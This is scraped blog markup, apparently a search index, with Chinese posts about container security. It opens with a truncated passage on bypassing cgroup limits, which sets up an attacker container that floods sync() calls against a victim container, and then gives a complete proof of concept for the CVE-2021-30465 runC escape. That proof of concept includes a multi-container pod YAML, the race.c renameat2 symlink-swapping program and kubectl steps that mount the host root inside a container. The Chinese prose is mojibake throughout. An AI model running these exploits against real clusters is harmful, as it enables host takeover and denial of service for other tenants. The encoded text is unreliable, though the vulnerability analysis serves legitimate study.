href=&#34;http://byteliu.com/2019/03/09/Linux-IO%E5%90%8C%E6%AD%A5%E5%87%BD%E6%95%B0-sync%E3%80%81fsync%E3%80%81fdatasync/&#34;&gt;syncå‚è€ƒ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è€Œblkio cgroupå­ç³»ç»Ÿæ— æ³•é™åˆ¶åŒæ­¥æœºåˆ¶æ‰€æ¶ˆè€—çš„èµ„æºï¼Œå…¶åŸå› æ˜¯&lt;code&gt;sync()&lt;/code&gt;å¯åŠ¨çš„è¿›ç¨‹åœ¨å†…æ ¸ç©ºé—´ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;expï¼š&lt;/strong&gt;&lt;br&gt;
åœ¨ä¸¤ä¸ªä¸åŒçš„æ ¸å¿ƒä¸Šè¿è¡Œä¸¤ä¸ªå®¹å™¨ï¼Œåœ¨ä¸€ä¸ªæ¶æ„å®¹å™¨ä¸­ä¸æ–­è°ƒç”¨&lt;code&gt;sync()&lt;/code&gt;ï¼Œåœ¨å…¶å®ƒå®¹å™¨ä¸­è¿›è¡ŒI/Oæ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;[èµ„æºé‡Šæ”¾æ”»å‡»](Venkatanathan Varadarajan, Thawan Kooburat, Benjamin Farley, Thomas Ris-tenpart, and Michael M Swift. 3: Improve Your CloudPerformance (At Your Neighbor&#39;s Expense). InACM CCS, 2012.)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# iostat
yum install -y sysstat

# æ–°å®‰è£…ä¸€å—ç¡¬ç›˜ï¼Œé‡å¯ç³»ç»Ÿ
lsblk 
NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda               8:0    0   30G  0 disk 
â”œâ”€sda1            8:1    0    1G  0 part /boot
â””â”€sda2            8:2    0   29G  0 part 
    â”œâ”€centos-root 253:0    0   27G  0 lvm  /
    â””â”€centos-swap 253:1    0    2G  0 lvm  [SWAP]
sdb               8:16   0   10G  0 disk /mnt
sr0              11:0    1  4.5G  0 rom

# æ ¼å¼åŒ–ç£ç›˜
mkfs.ext4 /dev/sdb

# æŒ‚è½½
mount /dev/sdb /mnt

# victim å®¹å™¨
docker run -d --name victim -v /mnt:/tmp --cpuset-cpus=&amp;quot;1&amp;quot; ubuntu /bin/bash -c &amp;quot;while true; do echo victim; sleep 1;done&amp;quot;
# attacker å®¹å™¨
docker run -d --name attacker --cpuset-cpus=&amp;quot;2&amp;quot; ubuntu /bin/bash -c &amp;quot;while true; do echo attacker; sleep 1;done&amp;quot;

# å°†è„šæœ¬cpåˆ°attackerä¸‹
docker cp mysync attacker:/root

# è¿›å…¥ attacker
docker exec -it attacker /bin/bash
cd /root
./mysync
exit

# è¿›å…¥ victim
docker exec -it victim /bin/bash
yum install fio -y

fio -ioengine=libaio -bs=4k -direct=1 -thread -rw=write -size=5G -filename=/mnt/test -name=&amp;quot;Max throughput&amp;quot; -iodepth=16 -runtime=20
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;case 3(ç­–ç•¥3)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ©ç”¨ç³»ç»ŸæœåŠ¡æ—¥å¿—ï¼Œå®ƒç”Ÿæˆæ¶ˆè€—cpuå’Œå—è®¾å¤‡å¸¦å®½çš„å·¥ä½œè´Ÿè½½ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;expï¼š&lt;/strong&gt;&lt;br&gt;
reï¼šå‘¨å¤©æ˜±,ç”³æ–‡åš,æ¨ç”·å­,æé‡‘åº“,ç§¦æ‰¿åˆš,å–»æœ›.Dockerç»„ä»¶é—´æ ‡å‡†è¾“å…¥è¾“å‡ºå¤åˆ¶çš„DoSæ”»å‡»åˆ†æ[J].ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨å­¦æŠ¥,2020,6(06):45-56.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ä½¿ç”¨ printf åœ¨å®¹å™¨å®ä¾‹å†…æŒç»­è¾“å‡ºæ•°æ® åˆ° stdoutï¼Œå¯ä»¥å¼•å‘ Docker ç»„ä»¶çš„é«˜ CPU æ¶ˆè€—ï¼Œ é€ æˆå¯¹å®¿ä¸»æœº CPU èµ„æºçš„ DoS æ”»å‡»ã€‚å…¶åŸå› æ˜¯ Docker å„ä¸ªç»„ä»¶é—´é€šè¿‡è‡ªåŠ¨è§¦å‘çš„ goroutine ä¸æ–­å¯¹ stdio è¿›è¡Œå¤åˆ¶ï¼Œæ¶ˆè€—å¤§é‡ CPUï¼Œå¯¼è‡´ DoS æ”»å‡»ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;case 4(ç­–ç•¥2ã€3)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ©ç”¨åœ¨å®¹å™¨å¼•æ“åœ¨å®¹å™¨å¼•æ“è¿›ç¨‹å’Œå†…æ ¸çº¿ç¨‹ä¸Šæ˜¯ç”Ÿæˆé¢å¤–çš„ä¸ºè®¡ç®—çš„å·¥ä½œè´Ÿè½½ã€‚&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;case 5(ç­–ç•¥2ã€4)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ©ç”¨è½¯ä¸­æ–­å¤„ç†æœºåˆ¶åœ¨å†…æ ¸çº¿ç¨‹ä¸Šæ¶ˆè€—CPUå‘¨æœŸå’Œä¸­æ–­ä¸Šä¸‹æ–‡ã€‚&lt;/p&gt;
">ã€å®¹å™¨ã€‘å®¹å™¨ç»•è¿‡Cgroupsé™åˆ¶ç­–ç•¥</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cve-2021-30465-runc-tao-yi-lou-dong/"" data-c="
          &lt;h2 id=&#34;cve-2021-30465-runcé€ƒé€¸æ¼æ´&#34;&gt;CVE-2021-30465 runCé€ƒé€¸æ¼æ´&lt;/h2&gt;
&lt;h3 id=&#34;poc&#34;&gt;POC&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ­å»ºk8sç¯å¢ƒã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ›å»º20ä¸ª(å¯ä»¥æ›´å¤šï¼Œå®éªŒæ•ˆæœä¼šæ›´æ˜æ˜¾)å®¹å™¨ï¼Œå…¶ä¸­ä¸€ä¸ªä¸ºæ­£å¸¸å®¹å™¨c1ï¼Œå…¶ä½™å¤šä¸ªéƒ½æ˜¯æ— æ³•æ­£å¸¸å¯åŠ¨çš„å®¹å™¨(å¯ä»¥ç›´æ¥ç”¨donotexists.com/do/not:exist)å®¹å™¨c2~c20ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥åŠåˆ›å»ºä¸¤ä¸ªvolumeæ•°æ®å·test1å’Œtest2ï¼Œåˆ†åˆ«æŒ‚è½½åœ¨å„ä¸ªå®¹å™¨ä¸­ã€‚env.yamlæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;apiVersion: v1
kind: Pod
metadata:
    name: attack
spec:
    terminationGracePeriodSeconds: 1
    containers:
    - name: c1
      image: ubuntu:latest
      command: [ &amp;quot;/bin/sleep&amp;quot;, &amp;quot;inf&amp;quot; ]
      env:
          - name: MY_POD_UID
            valueFrom:
              fieldRef:
                fieldPath: metadata.uid
      volumeMounts:
        - name: test1
          mountPath: /test1
        - name: test2
          mountPath: /test2
    - name: c2
      image: donotexists.com/do/not:exist
      command: [ &amp;quot;/bin/sleep&amp;quot;, &amp;quot;inf&amp;quot; ]
      volumeMounts:
        - name: test1
          mountPath: /test1
        - name: test2
          mountPath: /test1/mnt1
        - name: test2
          mountPath: /test1/mnt2
        - name: test2
          mountPath: /test1/mnt3
        - name: test2
          mountPath: /test1/mnt4
        - name: test2
          mountPath: /test1/zzz
    - name: c3
      image: donotexists.com/do/not:exist
      command: [ &amp;quot;/bin/sleep&amp;quot;, &amp;quot;inf&amp;quot; ]
      volumeMounts:
        - name: test1
          mountPath: /test1
        - name: test2
          mountPath: /test1/mnt1
        - name: test2
          mountPath: /test1/mnt2
        - name: test2
          mountPath: /test1/mnt3
        - name: test2
          mountPath: /test1/mnt4
        - name: test2
          mountPath: /test1/zzz
    
    ...çœç•¥c4~c20...
    
    volumes:
    - name: test1
      emptyDir:
        medium: &amp;quot;Memory&amp;quot;
    - name: test2
      emptyDir:
        medium: &amp;quot;Memory&amp;quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å‡†å¤‡ä¸€ä¸ªCç¨‹åºrace.cï¼Œç¼–è¯‘æˆraceäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ&lt;code&gt;gcc race.c -03 -o race&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/syscall.h&amp;gt;

/* musl libc does not define RENAME_EXCHANGE */
#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE 2
#endif

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, &amp;quot;Usage: %s name1 name2 linkdest\n&amp;quot;, argv[0]);
        exit(EXIT_FAILURE);
    }
    char *name1 = argv[1];
    char *name2 = argv[2];
    char *linkdest = argv[3];

    int dirfd = open(&amp;quot;.&amp;quot;, O_DIRECTORY|O_CLOEXEC);
    if (dirfd &amp;lt; 0) {
        perror(&amp;quot;Error open CWD&amp;quot;);
        exit(EXIT_FAILURE);
    }

    if (mkdir(name1, 0755) &amp;lt; 0) {
        perror(&amp;quot;mkdir failed&amp;quot;);
        //do not exit
    }
    if (symlink(linkdest, name2) &amp;lt; 0) {
        perror(&amp;quot;symlink failed&amp;quot;);
        //do not exit
    }

    while (1)
    {
        int rc = syscall(SYS_renameat2, dirfd, name1, dirfd, name2, RENAME_EXCHANGE);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å°†yamlç¼–æ’å¥½çš„é…ç½®é¡¹å¯åŠ¨ï¼Œ&lt;code&gt;kubectl apply -f env.yaml&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç­‰å¾…å®¹å™¨å¯åŠ¨ï¼Œ&lt;code&gt;kubectl get pods&lt;/code&gt;ï¼Œä¼šå‘ç°åªæœ‰ä¸€ä¸ªpodæ­£å¸¸å¯åŠ¨ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454101561.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;
&lt;p&gt;å°†race copyåˆ°c1ä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl cp race -c c1 attack:/test1/
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åœ¨c1ä¸­ç”Ÿæˆ&lt;code&gt;/test2/test2&lt;/code&gt;é“¾æ¥æ–‡ä»¶ï¼ŒæŒ‡å‘æ ¹ç›®å½•&lt;code&gt;/&lt;/code&gt;(è¿™é‡Œè½¯è¿æ¥çš„æ–‡ä»¶ååŠ¡å¿…å’Œæ•°æ®å·åå­—ç›¸åŒ)ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl exec -ti pod/attack -c c1 -- bash
ln -s / /test2/test2
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åœ¨c1å®¹å™¨ä¸­å¯åŠ¨raceç¨‹åº&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd test1
seq 1 4 | xargs -n1 -P4 -I{} ./race mnt{} mnt-tmp{} /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨è¿™é‡Œçš„ä½œç”¨æ˜¯å¯åŠ¨å››ä¸ªè¿›ç¨‹ï¼Œåˆ›å»º&lt;code&gt;mnt-tmpX&lt;/code&gt;è½¯è¿æ¥ï¼ŒæŒ‡å‘&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;ï¼Œç„¶åé€šè¿‡ç³»ç»Ÿè°ƒç”¨&lt;code&gt;renameat2&lt;/code&gt;ä¸æ–­äº¤æ¢&lt;code&gt;mntX&lt;/code&gt;å’Œ&lt;code&gt;mnt-tmpX&lt;/code&gt;ä¸¤ä¸ªæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç„¶åå°†åŸå…ˆc2-c20çš„å®¹å™¨é•œåƒè®¾ç½®å›ä¸€ä¸ªæ­£å¸¸çš„å®¹å™¨é•œåƒå³å¯ï¼ˆå³è®©c2-c20å®¹å™¨æ­£å¸¸å¯åŠ¨ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for c in {2..20}; do
  kubectl set image pod attack c$c=ubuntu:latest
done
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454140946.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç¨ç­‰åï¼Œç„¶å&lt;code&gt;kubectl get pods&lt;/code&gt;å¯ä»¥çœ‹åˆ°æ‰€æœ‰podæ­£å¸¸å¯åŠ¨ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454154611.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ­¤æ—¶æŸ¥çœ‹æ‰€æœ‰å®¹å™¨çš„&lt;code&gt;/test1/zzz&lt;/code&gt;ç›®å½•ï¼Œä¼šå‘ç°æœ‰éƒ¨åˆ†å®¹å™¨æŒ‡å‘å®¿ä¸»æœºæ ¹ç›®å½•ï¼Œé€ƒé€¸æˆåŠŸã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for c in {2..20}; do
  echo ~~ Container c$c ~~
  kubectl exec -ti pod/attack -c c$c -- ls /test1/zzz
done
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454170727.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;æ¼æ´åˆ†æ&#34;&gt;æ¼æ´åˆ†æ&lt;/h3&gt;
&lt;p&gt;å®¹å™¨å»æŒ‚è½½å·æ—¶ï¼Œæ˜¯ç”±å®¹å™¨å¼•æ“å»ç®¡ç†çš„ï¼Œæœ¬æ¼æ´çš„å®¹å™¨å¼•æ“æ˜¯runCï¼Œå³å¯¹åº”å·çš„æ‰€æœ‰æƒäº¤ç»™äº†å®¹å™¨å¼•æ“ã€‚&lt;/p&gt;
&lt;p&gt;CVE-2021-30465å°±æ˜¯å› ä¸ºrunCæ²¡æœ‰å¤„ç†å¥½å·ä¸‹é¢çš„èµ„æºç«äº‰è€Œå¯¼è‡´çš„ã€‚&lt;/p&gt;
&lt;p&gt;å½“æŒ‚è½½ä¸€ä¸ªvolumeæ•°æ®å·æ—¶ï¼ŒrunCä¼šä¿¡ä»»æºæ–‡ä»¶ï¼Œä¼šè®©å†…æ ¸è·Ÿéšç¬¦å·é“¾æ¥åˆ°æŒ‡å®šçš„æ–‡ä»¶ä½ç½®ï¼Œä½†runCä¸ä¿¡ä»»ç›®æ ‡æ–‡ä»¶å‚æ•°ï¼Œä¼šè°ƒç”¨&lt;code&gt;filepath-securejoin&lt;/code&gt;åº“å»è§£æç¬¦å·é“¾æ¥ï¼Œç¡®ä¿ç›®æ ‡æ–‡ä»¶åœ¨å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿå†…ã€‚&lt;code&gt;SecureJoinVFS()&lt;/code&gt;æ–‡æ¡£è§£é‡Šé“ï¼Œåªæœ‰ç¡®ä¿è¦checkçš„æ–‡ä»¶ä¸ä¼šè¢«ç¬¦å·é“¾æ¥æ‰€æ›¿æ¢ï¼Œè¯¥æ–¹æ³•æ‰æ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯é—®é¢˜å°±æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ›¿æ¢ã€‚&lt;/p&gt;
&lt;p&gt;runCæ˜¯é€šè¿‡ä¸€ä¸ª&lt;code&gt;securejoin.SecureJoinVFS()&lt;/code&gt;å‡½æ•°ï¼Œå…ˆå¯¹è¦æŒ‚è½½çš„ç›®å½•è¿›è¡Œcheckï¼Œç„¶åå†è¿›è¡Œmountæ“ä½œï¼Œè€Œåœ¨è¿™æœŸé—´å°±ä¼šäº§ç”Ÿä¸€ä¸ªæ—¶é—´å·®ï¼Œä»è€Œäº§ç”Ÿæ¡ä»¶ç«äº‰(TOCTTOU, time-of-check-to-time-of-use)ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨checkä¸€ä¸ªåˆæ³•æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶è¢«æ›¿æ¢æˆéæ³•æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªcheckç»“æŸåï¼Œéæ³•æ–‡ä»¶ä¼šè¢«mountã€‚åœ¨è¿™é‡Œå¯èƒ½ä¼šå‘ç”Ÿè·Ÿéšè½¯é“¾æ¥çš„è¡Œä¸ºï¼Œå°†å®¿ä¸»æœºä¸Šçš„ç›®å½•æŒ‚è½½è‡³å®¹å™¨ï¼Œä»è€Œäº§ç”Ÿé€ƒé€¸ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TOCTTOUï¼šå…ˆæ£€æŸ¥æŸä¸ªå‰ç½®æ¡ä»¶ï¼Œç„¶åä»‹äºè¿™ä¸ªå‰ç½®æ¡ä»¶è¿›è¡ŒæŸé¡¹æ“ä½œï¼Œä½†æ˜¯åœ¨æ£€æŸ¥å’Œæ“ä½œçš„æ—¶é—´é—´éš”å†…æ¡ä»¶å¯èƒ½è¢«æ”¹å˜ã€‚é€šå¸¸å‘ç”Ÿåœ¨å¤šçº¿ç¨‹åœ¨å¤„ç†æŸä¸ªéåŸå­æ“ä½œçš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;pocåˆ†æ&#34;&gt;POCåˆ†æ&lt;/h3&gt;
&lt;p&gt;åœ¨åˆ›å»ºpodæ—¶å¯ä»¥åˆ›å»ºå·ï¼Œä¾‹å¦‚emptydirç±»å‹çš„å·ï¼Œå…¶å’Œpodçš„ç”Ÿå‘½å‘¨æœŸä¸€æ ·ï¼Œpodä¸­æ‰€æœ‰å®¹å™¨éƒ½å¯ä»¥å…±äº«è¯¥å·ï¼Œå·ä¼šå­˜å‚¨åœ¨å®¿ä¸»æœºçš„&lt;code&gt;/var/lib/kubelet/pods/podsid/volumes/kubenetes.io~empty-dir/ä¸‹&lt;/code&gt;ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454184827.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¯¥podä¸­æ‰€æœ‰å®¹å™¨å¯ä»¥é€šå…³æŒ‚è½½è¿™äº›å·æ¥å…±äº«æ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆç”¨k8såˆ›å»ºä¸€ä¸ªpodï¼Œå…±åŒ…å«20ä¸ªå®¹å™¨(c1~c20)å’Œä¸¤ä¸ªvolume(test1ã€test2)ï¼Œc1æ˜¯ä¸€ä¸ªå¯ä»¥æ­£å¸¸å¯åŠ¨çš„å®¹å™¨ï¼Œc2~c20éƒ½æ˜¯æ•…éšœå®¹å™¨ï¼Œæ— æ³•æ­£å¸¸å¯åŠ¨ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;c1æ­£å¸¸æŒ‚è½½volume test1å’Œtest2åˆ†åˆ«åˆ°&lt;code&gt;/test1&lt;/code&gt;å’Œ&lt;code&gt;/test2&lt;/code&gt;ä¸‹ï¼Œç„¶ååˆ©ç”¨raceç¨‹åºåˆ›å»ºè‹¥å¹²ä¸ªæ­£å¸¸æ–‡ä»¶&lt;code&gt;mnt&lt;/code&gt;å’Œè‹¥å¹²ä¸ªæŒ‡å‘&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;çš„è½¯è¿æ¥æ–‡ä»¶&lt;code&gt;mnt-tmp&lt;/code&gt;ï¼Œç„¶åç¨‹åºwhile trueä¸æ–­äº¤æ¢&lt;code&gt;mnt&lt;/code&gt;å’Œ&lt;code&gt;mnt-tmp&lt;/code&gt;ã€‚å¦å¤–åœ¨&lt;code&gt;/test2&lt;/code&gt;ä¸‹åˆ›å»ºåä¸º&lt;code&gt;test2&lt;/code&gt;çš„è½¯è¿æ¥æŒ‡å‘&lt;code&gt;/&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨åˆ›å»ºpodæ—¶ä¼šä¸ºæ¯ä¸ªpodç”Ÿæˆä¸€ä¸ªPID_UIDï¼Œå¹¶ä¸ºæ¯ä¸ªpodåˆ›å»ºä¸€ä¸ªç›®å½•&lt;code&gt;/var/lib/kubelet/pods/podId&lt;/code&gt;ï¼Œè€Œpodä¸­åˆ›å»ºçš„æ¯ä¸ªå®¹å™¨éƒ½ä¼šé»˜è®¤æ³¨å…¥ä¸€ä¸ªç¯å¢ƒå˜é‡&lt;code&gt;MY_POD_UID&lt;/code&gt;ï¼Œå³å½“å‰æ‰€å±podçš„idã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–ä¸ºpodåˆ›å»ºçš„å·(ä»¥empty-dirç±»å‹çš„å·ä¸ºä¾‹)é»˜è®¤ä¼šå­˜åœ¨nodeå®¿ä¸»æœºçš„&lt;code&gt;/var/lib/kubelet/pods/podId/volumes/kubenetes.io~empty-dir/&lt;/code&gt;ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt1
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt-tmp1 -&amp;gt; /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt2 -&amp;gt; /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt-tmp2
...
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2/test2 -&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç„¶åå†å…¶ä½™å®¹å™¨æ­£å¸¸å¯åŠ¨æ—¶ï¼Œå°±ä¼šå…ˆå»æŒ‚è½½test1æ•°æ®å·åˆ°&lt;code&gt;/test1&lt;/code&gt;ç›®å½•ä¸‹ï¼Œç„¶åæŒ‚è½½test2åˆ°/test1/mnt/ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;æ­¤è¿‡ç¨‹ä¸­c1æ˜¯ä¸æ–­äº¤æ¢å®¹å™¨çš„&lt;code&gt;/test1/mnt&lt;/code&gt;å’Œ&lt;code&gt;/test1/mnt-tmp&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤å…¶å®ƒå®¹å™¨åœ¨å°†å·test2æŒ‚è½½è‡³&lt;code&gt;/test1/mnt&lt;/code&gt;æ—¶ï¼Œé¦–å…ˆè¿›è¡Œ&lt;code&gt;securejoin.SecureJoinVFS&lt;/code&gt;æ£€æŸ¥&lt;code&gt;mnt&lt;/code&gt;ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ç›®å½•ï¼Œè€Œå½“è¿›è¡Œmountæ“ä½œï¼Œ&lt;code&gt;mntx&lt;/code&gt;è¢«æ›¿æ¢æˆäº†ä¸€ä¸ªæŒ‡å‘&lt;code&gt;/var/lib/kubelet/pods/podId/volumes/kubenetes.io~empty-dir/&lt;/code&gt;çš„è½¯è¿æ¥ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æœ¬æ¥è¦è¿›è¡Œçš„æ“ä½œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2&amp;quot;, 
&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è·Ÿéšè½¯è¿æ¥åå°±å˜ä¸ºäº†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2&amp;quot;,
&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å³ç›¸å½“äºå°†å·test2çš„å†…å®¹ç›´æ¥æŒ‚è½½åœ¨äº†&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;ï¼Œå³å·test2è¦†ç›–äº†è¯¥ç›®å½•ï¼Œå› æ­¤å†æŒ‚è½½test2æ•°æ®å·åˆ°&lt;code&gt;test1/zzz&lt;/code&gt;ç›®å½•æ—¶ï¼Œå°±ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2&amp;quot;, &amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/zzz&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”±äºä¹‹å‰c1å®¹å™¨åˆ›å»ºäº†&lt;code&gt;/test2/test2&lt;/code&gt;æŒ‡å‘æ ¹ç›®å½•ï¼Œå› æ­¤è¿™é‡Œçš„&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;ä¸‹çš„&lt;code&gt;test2&lt;/code&gt;å…¶å®å°±æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰å®¿ä¸»æœºæ ¹ç›®å½•çš„è½¯é“¾æ¥ï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦åˆ›å»ºå’Œæ•°æ®å·åŒåçš„è½¯é“¾æ¥æ–‡ä»¶ï¼‰ï¼Œå³ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2 -&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;äºæ˜¯ä»¥ä¸Šæ“ä½œå°±å˜æˆäº†ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/&amp;quot;, &amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/zzz&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»è€Œå°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½åˆ°äº†å®¹å™¨çš„&lt;code&gt;/test1/zzz&lt;/code&gt;ä¸­ï¼Œå®ç°äº†å®¹å™¨é€ƒé€¸ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
